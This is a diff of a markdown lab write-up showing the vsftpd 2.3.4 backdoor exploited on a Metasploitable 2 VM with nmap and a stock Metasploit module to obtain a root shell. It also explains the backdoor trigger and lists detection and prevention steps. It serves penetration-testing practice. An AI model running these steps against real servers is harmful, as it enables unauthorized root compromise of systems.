@@ -9,11 +9,11 @@
 ## Table of Contents
 
 * [Introduction](#introduction)
+* [Attack Flow](#attack-flow)
 * [Why This Attack Works](#why-this-attack-works)
 * [Lab Setup](#lab-setup)
-* [What I Needed Before Starting](#what-i-needed-before-starting)
-* [Lessons Learned](#lesson-learned)
-* [Attack Flow](#attack-flow)
+* [Tools Used](#tools-used)
+* [Prerequisites](#prerequisites)
 * [Step 1 — Setting Up and Verifying the Target](#step-1--setting-up-and-verifying-the-target)
 * [Step 2 — Scanning the Target with Nmap](#step-2--scanning-the-target-with-nmap)
 * [Step 3 — Identifying the Vulnerable Service](#step-3--identifying-the-vulnerable-service)
@@ -22,54 +22,13 @@
 * [How Defenders Can Catch This](#how-defenders-can-catch-this)
 * [How to Prevent It](#how-to-prevent-it)
 * [References](#references)
-* [Conclusion](#conclusion)
+* [Lessons Learned](#lessons-learned)
 
 ## Introduction
 
-Metasploitable 2 is a Linux virtual machine that contains several intentionally vulnerable services and applications for penetration testing practice. In this lab, I targeted the vsftpd 2.3.4 backdoor to gain root access to the target machine.
+Metasploitable 2 is a vulnerable Linux machine created for security testing practice. It contains many old and misconfigured services that can be tested in a lab environment.
 
-## Why This Attack Works
-
-In 2011, there was a backdoor introduced in the vsftpd 2.3.4 source code. It was very basic; if the username contained :) when trying to log in using FTP, then vsftpd would create a bind shell on TCP port 6200 in root. Anyone that knew how could immediately have root-level access to the computer without having any valid credentials.
-The Metasploitable installation comes with this vulnerable version of vsftpd.
-
-## Lab Setup
-
-| Component   | Details    |
-|-------------|------------|
-| Attacker Machine  | Kali Linux                  |
-| Target Machine    | Metasploitable 2            |
-| Target IP         | 192.168.5.145               |
-| Network           | VMware Host-Only Network    |
-
-
-### Tools Used
-
-| Tool        | Purpose     |
-|-------------|-------------|
-| nmap        | Scan and identify open services on the target |
-| Metasploit  | Run the vsftpd 2.3.4 backdoor exploit         |
-
-
-## What I Needed Before Starting
-
-| What    | Why     |
-|---------|---------|
-| Metasploitable 2 VM running | Target machine                        |
-| Kali Linux                  | Attacker machine with all tools ready |
-| nmap                        | To scan and identify open services    |
-| Metasploit                  | To run the vsftpd exploit             |
-
-
-## Lessons Learned
-
-Through the process of this attack, I understood that:
-
-- Conducting a version scan using nmap is always the initial step; knowledge of the specific version of the service is crucial for the successful selection of the appropriate exploit.
-- The backdoor of vsftpd 2.3.4 is among the most famous exploits used in penetration testing exercises.
-- It was very easy to exploit the vulnerability using Metasploit; all one needed was to enter the IP address of the target.
-- Direct access to root without any escalation of privileges highlights the dangers that arise from the use of unpatched services.
-- This is a perfect illustration of why supply chain security is important; the backdoor was hardcoded into the source code of the program.
+In this lab, I tested the FTP service running on port 21 and found that it was using vsftpd 2.3.4. This version contains a backdoor that allows an attacker to get a root shell without needing valid login credentials.
 
 ## Attack Flow
 
@@ -95,9 +54,42 @@ Got a root shell directly
 whoami → root
 ```
 
+## Why This Attack Works
+
+In 2011, there was a backdoor introduced in the vsftpd 2.3.4 source code. It was very basic; if the username contained :) when trying to log in using FTP, then vsftpd would create a bind shell on TCP port 6200 in root. Anyone that knew how could immediately have root-level access to the computer without having any valid credentials.
+The Metasploitable installation comes with this vulnerable version of vsftpd.
+
+## Lab Setup
+
+| Component   | Details    |
+|-------------|------------|
+| Attacker Machine  | Kali Linux                  |
+| Target Machine    | Metasploitable 2            |
+| Target IP         | `192.168.5.145`               |
+| Network           | VMware Host-Only Network    |
+
+## Tools Used
+
+| Tool        | Purpose     |
+|-------------|-------------|
+| `nmap`        | Scan and identify open services on the target |
+| `Metasploit`  | Run the vsftpd 2.3.4 backdoor exploit         |
+
+## Prerequisites
+
+| What | Why |
+|------|-----|
+| Kali Linux | Used as the attacker machine |
+| Metasploitable 2 VM running | Target machine for testing |
+| Network connection between both machines | Required for communication between attacker and target |
+| nmap installed | To scan open ports and identify services |
+| Metasploit Framework installed | To run the vsftpd 2.3.4 exploit |
+
 ## Step 1 — Setting Up and Verifying the Target
 
 I powered on the Metasploitable 2 virtual machine in VMware. Once it booted up, the login screen showed the default credentials:
+I powered on the Metasploitable 2 virtual machine in VMware. Once it booted up, the login screen showed the default credentials:
+
 
 ```bash
 Login: msfadmin
@@ -125,7 +117,7 @@ eth0      Link encap:Ethernet  HWaddr 00:0c:29:48:60:38
           RX bytes:5085 (4.9 KB)  TX bytes:6880 (6.7 KB)
           Interrupt:17 Base address:0x2000
 ```
-The machine was up and running at `192.168.5.145` I switched over to my Kali machine and started the attack from there.
+The machine was up and running with the IP address `192.168.5.145`. I then switched to my Kali machine and started the attack from there.
 
 <p align="center">
   <img src="images/step1-2.png" width="600">
@@ -138,8 +130,13 @@ I ran an nmap scan to find open ports and identify running services on the targe
 ```bash
 nmap -sV -sC 192.168.5.145
 ```
-`-sV`: Version detection — finds the exact version of each service running
-`-sC` : Runs default nmap scripts against discovered services
+**Breakdown**
+
+| Part | Description |
+|------|-------------|
+| `-sV` | Detects the version of each service running on the target |
+| `-sC` | Runs the default Nmap scripts against discovered services |
+| `192.168.5.145` | IP address of the target machine |
 
 **Output:**
 
@@ -174,44 +171,59 @@ PORT     STATE SERVICE     VERSION
 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
 ```
-The scan came back with a huge list of open ports and services. The machine was running a lot of outdated and vulnerable software. The one that stood out right away was:
+The scan found several open ports and services running on the target. Many of them were old versions. The one that caught my attention was:
 
 ```
 21/tcp   open  ftp   vsftpd 2.3.4
 ```
-vsftpd 2.3.4 is a well known version with a backdoor — that was my target.
+`vsftpd 2.3.4` is a well-known vulnerable version with a backdoor, so I decided to target that service.
 
 ## Step 3 — Identifying the Vulnerable Service
 
-From the nmap output I confirmed:
+From the Nmap scan results, I confirmed that the FTP service was running `vsftpd 2.3.4`.
 
 | Service | Port | Version         | Status   |
 |---------|------|-----------------|----------|
 | FTP     | 21   | vsftpd 2.3.4    | Vulnerable to backdoor exploit|
 
+`vsftpd 2.3.4` is a well-known vulnerable version. In 2011, a backdoor was added to its source code. When the backdoor is triggered, it opens a root shell on TCP port `6200`.
 
-vsftpd 2.3.4 has a backdoor that was added directly into the source code in 2011. When triggered, it opens a root shell on port 6200. Metasploit has a ready made module for this.
+Since Metasploit already includes a module for this vulnerability, I used it in the next step.
 
 ## Step 4 — Exploiting vsftpd 2.3.4 with Metasploit
 
-- ### Started Metasploit
+### Started Metasploit
 
 I started Metasploit Framework.
 
 ```bash
 msfconsole -q
 ```
+**Breakdown**
+
+| Part | Description |
+|---------|-------------|
+| `msfconsole` | Starts the Metasploit Framework console |
+| `-q` | Starts Metasploit in quiet mode by hiding the banner |
+
 <p align="center">
   <img src="images/step3-1.png" width="600">
 </p>
 
-- ### Searched for the vsftpd Exploit
+### Searched for the `vsftpd` Exploit
 
-I searched for an exploit related to **vsftpd**.
+I searched Metasploit for exploits related to `vsftpd`.
 
 ```bash
 msf > search vsftpd
 ``` 
+**Breakdown**
+
+| Part | Description |
+|---------|-------------|
+| `search` | Searches the Metasploit module database |
+| `vsftpd` | Keyword used to find modules related to the vsftpd service |
+
 ```
 Matching Modules
 ================
@@ -221,20 +233,28 @@ Matching Modules
    0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
    1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD v2.3.4 Backdoor Command Execution
 
-
 Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
 ```
+The search returned the `exploit/unix/ftp/vsftpd_234_backdoor` module, which matched the version running on the target.
+
 <p align="center">
   <img src="images/step4-1.png" width="600">
 </p>
 
-- ### Selected the Exploit
+### Selected the Exploit
 
 I selected the **vsftpd 2.3.4 backdoor** exploit module.
 
 ```bash
 msf > use exploit/unix/ftp/vsftpd_234_backdoor
 ```
+**Breakdown**
+
+| Part | Description |
+|---------|-------------|
+| `use` | Selects a Metasploit module |
+| `exploit/unix/ftp/vsftpd_234_backdoor` | Module used to exploit the vsftpd 2.3.4 backdoor |
+
 **Output:**
 
 ```
@@ -245,13 +265,19 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) >
   <img src="images/step4-2.png" width="600">
 </p>
 
-- ### Checked the Options
+### Checked the Options
 
 Before running the exploit, I checked the required options.
 
 ```bash
 msf exploit(vsftpd_234_backdoor) > show options
 ```
+**Breakdown**
+
+| Part | Description |
+|---------|-------------|
+| `show options` | Displays the options required by the selected module |
+
 **Output:**
 
 ```
@@ -268,13 +294,21 @@ I saw that only the target IP address needed to be configured because the FTP se
   <img src="images/step4-3.png" width="600">
 </p>
 
-- ### Set the Target IP
+### Set the Target IP
 
 I set the target IP address.
 
 ```bash
 msf exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.5.145
 ```
+**Breakdown**
+
+| Part | Description |
+|---------|-------------|
+| `set` | Sets the value of a module option |
+| `RHOSTS` | Specifies the target IP address |
+| `192.168.5.145` | IP address of the target machine |
+
 **Output:**
 
 ```
@@ -284,7 +318,7 @@ RHOSTS => 192.168.5.145
   <img src="images/step4-4.png" width="600">
 </p>
 
-- ### Ran the Exploit
+### Ran the Exploit
 
 After setting the target IP, I ran the exploit.
 
@@ -294,7 +328,7 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) > run
 
 ## Step 5 — Getting a Root Shell
 
-After running the exploit, I got a Meterpreter session.
+After running the exploit, Metasploit opened a Meterpreter session.
 
 **Output:**
 ```
@@ -310,13 +344,25 @@ To access the target's shell, I ran:
 ```bash
 meterpreter > shell
 ```
+**Breakdown**
+
+| Part | Description |
+|---------|-------------|
+| `shell` | Opens a command shell on the target from the Meterpreter session |
+
 Since I wanted an interactive Bash shell, I ran:
 
 ```bash
 /bin/bash -i
 ```
+**Breakdown**
 
-- ### Confirmed Root Access
+| Part | Description |
+|---------|-------------|
+| `/bin/bash` | Starts the Bash shell |
+| `-i` | Starts Bash in interactive mode |
+
+### Confirmed Root Access
 
 I checked the current user:
 
@@ -342,29 +388,29 @@ The `whoami` and `id` commands confirmed that I had root access on the target ma
 
 ## How Defenders Can Catch This
 
-
-|  Indicator      |  What to Look For    |
-|-----------------|----------------------|
-| Unexpected connection to **port 6200**           | Firewall logs or network traffic showing connections to port 6200                  |
-| FTP login attempt with :) in the username        | FTP authentication logs showing usernames that contain :)                          |
-| vsftpd 2.3.4 running on the server               | Vulnerability scan results or software inventory identifying the vulnerable version|
-| Unusual outbound connection from the FTP service | Process monitoring and network logs showing unexpected outbound connections        |
-
+| Indicator | What to Look For |
+|-----------|------------------|
+| Old vsftpd version running on the server | Check installed software versions and vulnerability scan results |
+| FTP service running on an unnecessary port | Review open ports and disable unused services |
+| Connection attempts to port 6200 | Monitor firewall logs and network traffic |
+| FTP login attempts with unusual usernames like `:)` | Check FTP authentication logs |
+| Unexpected root shell created by FTP service | Monitor processes and review system logs |
+| Unpatched FTP software | Regular vulnerability scans and software updates |
 
 ## How to Prevent It
 
-- **Remove or upgrade vsftpd immediately**
+**Remove or upgrade vsftpd immediately**
 
 ```bash
 sudo apt remove vsftpd
 sudo apt install vsftpd
 ```
-- **Block port 6200 at the firewall**
+**Block port 6200 at the firewall**
 
 ```bash
 iptables -A INPUT -p tcp --dport 6200 -j DROP
 ```
-- **Disable FTP if not needed**
+**Disable FTP if not needed**
 
 FTP is an outdated and insecure protocol. Use SFTP or SCP instead:
 
@@ -372,25 +418,15 @@ FTP is an outdated and insecure protocol. Use SFTP or SCP instead:
 sudo systemctl stop vsftpd
 sudo systemctl disable vsftpd
 ```
-- **Run regular vulnerability scans**
+**Run regular vulnerability scans**
 
 Tools like OpenVAS or Nessus would flag vsftpd 2.3.4 immediately as a critical vulnerability.
 
-- **Always check software versions against known CVEs**
+**Always check software versions against known CVEs**
 
 ```bash
 https://nvd.nist.gov
 ```
-
-## Conclusion
-
-By completing this attack I showed that:
-
-- A single outdated and unpatched service was enough to get direct root access without any privilege escalation
-- nmap version scanning is the most important first step in any penetration test
-- The vsftpd 2.3.4 backdoor is a good example of a supply chain attack — the malicious code was added to the source itself
-- Metasploit made the exploitation process fast and straightforward
-- Keeping software updated and running regular vulnerability scans would have prevented this completely
 
 ## References
 
@@ -401,3 +437,15 @@ By completing this attack I showed that:
 | Rapid7 — **vsftpd 2.3.4 Backdoor Module** | https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor |
 | MITRE ATT&CK — **T1190: Exploit Public-Facing Application** | https://attack.mitre.org/techniques/T1190/ |
 | National Vulnerability Database (NVD) — **CVE-2011-2523** | https://nvd.nist.gov/vuln/detail/CVE-2011-2523 |
+
+## Lessons Learned
+
+While working through this attack I learned that:
+
+- Service version detection is an important first step because knowing the exact version helps identify possible vulnerabilities.
+- Running outdated services can lead to complete system compromise.
+- The vsftpd 2.3.4 backdoor allowed direct root access without needing privilege escalation.
+- Tools like nmap help identify vulnerable services quickly during a security assessment.
+- Metasploit can simplify exploitation when a matching vulnerability is already known.
+- Keeping services updated and removing unnecessary software can prevent attacks like this.
+- Supply chain issues can be dangerous because malicious code can be introduced into software before it reaches users.
